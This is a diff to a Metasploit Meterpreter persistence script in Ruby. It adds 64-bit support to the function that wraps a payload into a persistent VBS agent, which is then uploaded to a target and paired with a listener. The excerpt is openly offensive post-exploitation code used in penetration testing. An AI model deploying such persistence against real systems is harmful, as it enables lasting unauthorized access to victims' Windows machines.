@@ -72,13 +72,23 @@ end
 
 # Function for Creating persistent script
 #-------------------------------------------------------------------------------
-def create_script(delay,altexe,raw)
-  if altexe
-    vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw,
-                                          {:persist => true, :delay => delay, :template => altexe})
+def create_script(delay,altexe,raw,is_x64)
+  if is_x64
+    if altexe
+      vbs = ::Msf::Util::EXE.to_win64pe_vbs(@client.framework, raw,
+                                            {:persist => true, :delay => delay, :template => altexe})
+    else
+      vbs = ::Msf::Util::EXE.to_win64pe_vbs(@client.framework, raw,
+                                            {:persist => true, :delay => delay})
+    end
   else
-    vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw,
-                                          {:persist => true, :delay => delay})
+    if altexe
+      vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw,
+                                            {:persist => true, :delay => delay, :template => altexe})
+    else
+      vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw,
+                                            {:persist => true, :delay => delay})
+    end
   end
   print_status("Persistent agent script is #{vbs.length} bytes long")
   return vbs
@@ -224,7 +234,7 @@ print_status("Running Persistance Script")
 print_status("Resource file for cleanup created at #{@clean_up_rc}")
 # Create and Upload Payload
 raw = create_payload(payload_type, rhost, rport)
-script = create_script(delay, altexe, raw)
+script = create_script(delay, altexe, raw, payload_type.include?('/x64/'))
 script_on_target = write_script_to_target(target_dir, script)
 
 # Start Multi/Handler
